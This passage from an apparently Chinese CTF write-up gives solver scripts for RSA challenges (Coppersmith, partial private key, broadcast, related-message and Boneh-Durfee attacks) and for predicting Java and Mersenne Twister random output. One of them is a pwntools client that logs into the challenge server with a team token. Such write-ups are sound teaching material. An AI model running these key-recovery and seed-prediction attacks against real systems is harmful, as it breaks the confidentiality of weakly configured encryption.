class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0x372d81ecfff69fcb7317e7c0190d03e7f0a4ba85aeee3d98a13286a4b3914a0f5503c3a422b6f7e673c4008b0e77b2fc02c26b47fba10b2b5a2079dbc6402becc7175846854b0f5b0186b3b723b3b82c99ac57bdde624c9bb1b40fde1ffbdede598355ad3c8db3b92eda266b8fa6487bab3b07dfaf6ea27aa55384816f1c6cfdL</span></span><br><span class="line">pp = <span class="number">0x84ff948225107a552a08aea00214eb9f7f97d9dcafa08d04840bebfc5bea2e05b95153f19e79dea79b1486421ed747ca</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c=<span class="number">0xf90f4099336dc4dee753268e2aadf57211415f8fd307829702eef202dc0b5c11d5c8e4627cf90c57d23b4e3ac545aef20773fa9f21a2c49a71bcda715452b0ab62c9b36a7c838868d0e229eede374bff33a7defc1a229a45a1e568cb8e8031e8a8d5a1e36268b5732024fa3b13d77eb33425bf812de98abc7934295041e1367L</span></span><br><span class="line">pbits=<span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>**<span class="number">9</span>):</span><br><span class="line">    p=pp &lt;&lt; <span class="number">9</span></span><br><span class="line">    p +=b</span><br><span class="line">    kbits = pbits-p.nbits()</span><br><span class="line">    p=p&lt;&lt;kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + p</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">        p2=int(p+roots)</span><br><span class="line">        q=n/int(p2)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"p:"</span>,p2</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"q:"</span>,q</span><br><span class="line">        phin = (p2<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>第三关：</p><p>已知d低位，找脚本跑：<a href="https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/</a></p><p>这里坑了很久，因为给的d低位是512 位，跑脚本总是报错，之后才发现原来给的位数太多，代码中有个数变成负数了…</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f5e7d7e274bde309.png" alt="image.png"></p><p>我改成了利用后500位，就好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n=<span class="number">0x77789924c9cee176e8f9ae4a40d29c0a61891d67fc825b6e1570e980a8cb275f138d5f6e118eff6f76673b382cfaaa4f4a9c204ee30d7c887a5c70197bc2701f7f61da8c65e6972398d2842faa51d3274ee99716e56fba888a91263b5e7986363b75c82a86fc9a964aa65b03ede04b4ae0dfb6f96a7fb928e04d092d782148d</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    d = <span class="number">0x4bf6610df9dd72df11b3c273d8795b7765374a73e1f3e18abb0af883e1d546cc2fca3ab53e5b18baa228053972472d23e87f411e1f2781faa89ede9bc09b4d53</span></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = <span class="number">500</span></span><br><span class="line">    d0 = d &amp; (<span class="number">2</span>^kbits<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    p = find_p(d0, kbits, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found p: %d"</span> % p</span><br><span class="line">    q = n//p</span><br><span class="line">    <span class="keyword">print</span> d</span><br><span class="line">    <span class="keyword">print</span> inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br></pre></td></tr></table></figure><p>第四关：</p><p>广播攻击，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">n2=<span class="number">0x3d9e0e106474d42db39ba27c96cf830737ee86ee77ff03298f1f0460612e9488e7ad402a1f2aacef1a13c4cf75b457e9957f798fcfdb2d510af2a6fceab71cd64c717df829e755bf8573edda4e98269da9eaf6e89c1c656970c7e1dbf9c0a39b4efcb64c9ba805cc8b22ab90022491abea03cc03ac6a6aabcaa210c30ac00f5fL</span></span><br><span class="line">c1=<span class="number">0x64f9355e681326771f3fdd7d07c46cf493dfd7199b9b16b2d33493c3afd33ef4f35184b75de30e27ab452d3addc2f81e9547d9cb061e9f14396e7387e43e637f2004cc83ad81c0930c144d8587e25330290e808c79730db770934ea034a00223f674a484a0efa0df2d2b649fce492facaa79a6aa9344dd4b5b6e02915c40008aL</span></span><br><span class="line">n1=<span class="number">0x7f084b13487e7e0f2e9d6976cb41e825e0dac9bf13a5712bd1610b17b5c1cec51fe98938f5d4e73e6b9af2f92b95383ed39c6a0be779fdf3275a059e55014bbe4c4dd337b72db18e704d5bbe291d06d9c1b263cdb7719ccd6cf57d812a2a54f369696d04c166617f56b3010e07f98354d05e9116add4281edee2ac32f70fb317L</span></span><br><span class="line">c2=<span class="number">0xf8f04645ea1d7f3aaaea76a17ad8c20c1483c457135d5a29721d11f206fb2b7e17293f0c0b5be7eaf55f1917367881a2c3403b319a22a53336ee4848b6d255e4e26df500ca54c6317611ac1181a739288362a6084a53342032517ea2b623d332264571003af203c9cd2e8269a9933dfacaf50442f298d99d699d3e4c3511bc9L</span></span><br><span class="line">n3=<span class="number">0x6e24ae9edc6e30e5ed4fd5982914bf0d4cba5695a47752858d057f0c20ffc9de7471bea76ac4bd336b51cafc7aeb24f3f76bab3e0ede10b214b1c68584db0abf4c9854ae98ffabb01b503f76604b8dead5520e1c3e6750be75580b683e4630c1f6b5e0575e8be9ecd6a68e16dc1fbb3f60fbb0159ee951c8a858cf6a66d83a53L</span></span><br><span class="line">c3=<span class="number">0x4cf28e0b122c9727cff60c7d71192573c231673cd7742ba18e9e5d391a346bc470e693a308ca65454913569f3d0e5f0f15c62afa2285644fc5b9919c22e87ca8f746eec9cff7b1e97761ae3145e3c007acc603928e3c04d47067c2325070cbdea41c6fca21665eb186f26e3e275c456427bf7da1b5bd325eac16c2710ff5102eL</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">C,N=GCRT([n1,n2,n3],[c1,c2,c3])</span><br><span class="line">m=iroot(C,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m).encode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure><p>第五关：</p><p>Related Message Attack，代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmessage</span><span class="params">(a, b, c1, c2, n)</span>:</span></span><br><span class="line">    b3 = powmod(b, <span class="number">3</span>, n)</span><br><span class="line">    part1 = b * (c1 + <span class="number">2</span> * c2 - b3) % n</span><br><span class="line">    part2 = a * (c1 - c2 + <span class="number">2</span> * b3) % n</span><br><span class="line">    part2 = invert(part2, n)</span><br><span class="line">    <span class="keyword">return</span> (part1 * part2) % n</span><br><span class="line">n=<span class="number">0x4050e234e683b2527380ea84d391151be80831abcd540f3467a31511d708b0be459725b39581a3d4edcffa856f31b1eca19a37b7e7c34e378bb3ed7e660b4a19d24769497d26aea09eab0e2a2849d006cb4b1f61b6b7ee4c3ec3fc58383e3c6eb2fcfbe9c36343bfe74fec5e952e477bd4493f01a0a81092d680a776b1a555e7L</span></span><br><span class="line">c1=<span class="number">0x3fa7da49d8cbc6fe46bf15b9c35107fc0fe043eb3c94c1b6f214bf3943ed5310cb92e8aea576c6074a518f9a5b7d3de535158146ed3a74a298d98f55712359e795f1e83f253c61344617c5e35933c902fd49e50f37dbac51c23f2a0b954247b8af376444faca957db97f94b42dda469acfc5aab7574a486f6e326bfee0aa420dL</span></span><br><span class="line">c2=<span class="number">0x3edc18248feddad66f95550e3ec77d1de26dd9236824d049587aa567fa52e9290dee4416c78c39adda36b6eb1169df42b68a5cebdb07a784223c07680c3cd64c19f9fb7483d5ab7cd6d7bebf07ae0da0ee91557d9f1bbcbc8b9f7362f37050d718dca8fbd8749ab7dad7a531876fb3db988f3598ed6ce7c9d32102986a68a9a1L</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(getmessage(<span class="number">1</span>,<span class="number">1</span>,c2,c1,n)).encode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure><p>第六关：</p><p>Boneh and Durfee attack，从<a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a>上改的。</p><p>最终exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">dict=[chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">token=<span class="string">'35561ebb6d2cd5f8f6dddd1c1f60b613'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pow</span><span class="params">(part_hex,hash_value)</span>:</span></span><br><span class="line">pre=part_hex.decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(dict,repeat=<span class="number">3</span>):</span><br><span class="line"> i=pre+<span class="string">''</span>.join(s)</span><br><span class="line"> <span class="keyword">if</span> sha256(i).hexdigest()==hash_value:</span><br><span class="line"> <span class="keyword">print</span> <span class="string">"success"</span></span><br><span class="line"> <span class="keyword">return</span> i.encode(<span class="string">"hex"</span>)</span><br><span class="line">r=remote(<span class="string">"119.3.245.36"</span>,<span class="number">12345</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.recvuntil(<span class="string">".hexdigest()="</span>)</span><br><span class="line">hash_value=r.recv(<span class="number">64</span>)</span><br><span class="line">r.recvuntil(<span class="string">".encode('hex')="</span>)</span><br><span class="line">part_hex=r.recv(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> hash_value,part_hex</span><br><span class="line">result=Pow(part_hex,hash_value)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(result)</span><br><span class="line">r.sendlineafter(<span class="string">'teamtoken:'</span>,token)</span><br><span class="line">r.recvuntil(<span class="string">"Generating challenge 1\n"</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"081db7350876267d03e36e3dd70129e08167e715c6508ac4ee1afbd4992ad0ac8a5021ab1c084f8b087ab72a155989816a263213d624490a8888766ecc472542"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"encode('hex')="</span>,<span class="string">"21d2ce15ce3916a5e3b661de35d132dc32bac36de0e8288baa7a1a36207e6e54b643e701445398fee048b0912090996b5924bf36e5765334ef1029eb05ac128e"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"encode('hex')="</span>,<span class="string">"0a56f8eff78995a1a80369469acbfa87b8d17c6918bff28246a6a9c0ffa6875b2f33b3399326b6929e49c22bbba63f71b04b0d45a7b1ac808f5dff41475ae5d5"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"encode('hex')="</span>,<span class="string">"0f30aba3355b7ead17f6768158fff2ccdc6e66f8123bb283864e70629bfe0db705b68e299e337c3a4ce1596d880b72689bfab8d066e568b00998ad13330f3dad"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"encode('hex')="</span>,<span class="string">"499f89d02d2d95427229d369d86d26063465523c49176ffed8786cc7b258cb647f79512cbb9ecab746d8f322f42ae6fd71362ee6e9e6086c34865d626cbab2da"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"encode('hex')="</span>,<span class="string">"6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-656a555239a7d7c4.png" alt="image.png"></p><h3 id="RANDOMSTUDY"><a href="#RANDOMSTUDY" class="headerlink" title="RANDOMSTUDY"></a>RANDOMSTUDY</h3><p>第一关，仿照服务器生成种子的时间，这边也生成个大概的时间，爆破：</p><p>第二关，java random nextint 可以通过生成的两个数来预测种子，java文件在这里：<a href="https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java" target="_blank" rel="noopener">https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java</a></p><p>简单改一下java文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReplicatedRandom</span> <span class="keyword">extends</span> <span class="title">Random</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Replicate the state of a Random using a single value from its nextDouble</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">double</span> nextDouble)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// nextDouble() is generated from ((next(26) &lt;&lt; 27) + next(27)) / (1L &lt;&lt; 53)</span></span><br><span class="line">        <span class="comment">// Inverting those operations will get us the values of next(26) and next(27)</span></span><br><span class="line">        <span class="keyword">long</span> numerator = (<span class="keyword">long</span>)(nextDouble * (<span class="number">1L</span> &lt;&lt; <span class="number">53</span>));</span><br><span class="line">        <span class="keyword">int</span> first26 = (<span class="keyword">int</span>)(numerator &gt;&gt;&gt; <span class="number">27</span>);</span><br><span class="line">        <span class="keyword">int</span> last27 = (<span class="keyword">int</span>)(numerator &amp; ((<span class="number">1L</span> &lt;&lt; <span class="number">27</span>) - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> replicateState(first26, <span class="number">26</span>, last27, <span class="number">27</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replicate the state of a Random using a single value from its nextLong</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">long</span> nextLong)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> last32 = (<span class="keyword">int</span>)(nextLong &amp; ((<span class="number">1L</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">int</span> first32 = (<span class="keyword">int</span>)((nextLong - last32) &gt;&gt; <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">return</span> replicateState(first32, <span class="number">32</span>, last32, <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replicate the state of a Random using two consecutive values from its nextInt</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">int</span> firstNextInt, <span class="keyword">int</span> secondNextInt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> replicateState(firstNextInt, <span class="number">32</span>, secondNextInt, <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replicate the state of a Random using two consecutive values from its nextFloat</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">float</span> firstNextFloat, <span class="keyword">float</span> secondNextFloat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> replicateState((<span class="keyword">int</span>)(firstNextFloat * (<span class="number">1</span> &lt;&lt; <span class="number">24</span>)), <span class="number">24</span>, (<span class="keyword">int</span>)(secondNextFloat * (<span class="number">1</span> &lt;&lt; <span class="number">24</span>)), <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">int</span> nextN, <span class="keyword">int</span> n, <span class="keyword">int</span> nextM, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Constants copied from java.util.Random</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> multiplier = <span class="number">0x5DEECE66DL</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> addend = <span class="number">0xBL</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> mask = (<span class="number">1L</span> &lt;&lt; <span class="number">48</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> upperMOf48Mask = ((<span class="number">1L</span> &lt;&lt; m) - <span class="number">1</span>) &lt;&lt; (<span class="number">48</span> - m);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// next(x) is generated by taking the upper x bits of 48 bits of (oldSeed * multiplier + addend) mod (mask + 1)</span></span><br><span class="line">        <span class="comment">// So now we have the upper n and m bits of two consecutive calls of next(n) and next(m)</span></span><br><span class="line">        <span class="keyword">long</span> oldSeedUpperN = ((<span class="keyword">long</span>)nextN &lt;&lt; (<span class="number">48</span> - n)) &amp; mask;</span><br><span class="line">        <span class="keyword">long</span> newSeedUpperM = ((<span class="keyword">long</span>)nextM &lt;&lt; (<span class="number">48</span> - m)) &amp; mask;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Bruteforce the lower (48 - n) bits of the oldSeed that was truncated.</span></span><br><span class="line">        <span class="comment">// Calculate the next seed for each guess of oldSeed and check if it has the same top m bits as our newSeed.</span></span><br><span class="line">        <span class="comment">// If it does then the guess is right and we can add that to our candidate seeds.</span></span><br><span class="line">        ArrayList&lt;Long&gt; possibleSeeds = <span class="keyword">new</span> ArrayList&lt;Long&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> oldSeed = oldSeedUpperN; oldSeed &lt;= (oldSeedUpperN | ((<span class="number">1L</span> &lt;&lt; (<span class="number">48</span> - n)) - <span class="number">1</span>)); oldSeed++) &#123;</span><br><span class="line">            <span class="keyword">long</span> newSeed = (oldSeed * multiplier + addend) &amp; mask;</span><br><span class="line">            <span class="keyword">if</span> ((newSeed &amp; upperMOf48Mask) == newSeedUpperM) &#123;</span><br><span class="line">                possibleSeeds.add(newSeed);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (possibleSeeds.size() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// If there's only one candidate seed, then we found it!</span></span><br><span class="line">            setSeed(possibleSeeds.get(<span class="number">0</span>) ^ multiplier); <span class="comment">// setSeed(x) sets seed to `(x ^ multiplier) &amp; mask`, so we need another `^ multiplier` to cancel it out</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (possibleSeeds.size() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Didn't find a unique seed. Possible seeds were: "</span> + possibleSeeds);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Failed to find seed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i1=Integer.parseInt(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> i2=Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        ReplicatedRandom rr = <span class="keyword">new</span> ReplicatedRandom();</span><br><span class="line">        rr.replicateState(i1, i2);</span><br><span class="line">        System.out.println( rr.nextInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下java文件，这样我们就可以通过python的subprocess调用class文件了，再把运行的结果获取到。</p><p>第三关：可以通过生成的随机数序列来预测，参考：<a href="https://github.com/kmyk/mersenne-twister-predictor" target="_blank" rel="noopener">https://github.com/kmyk/mersenne-twister-predictor</a></p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 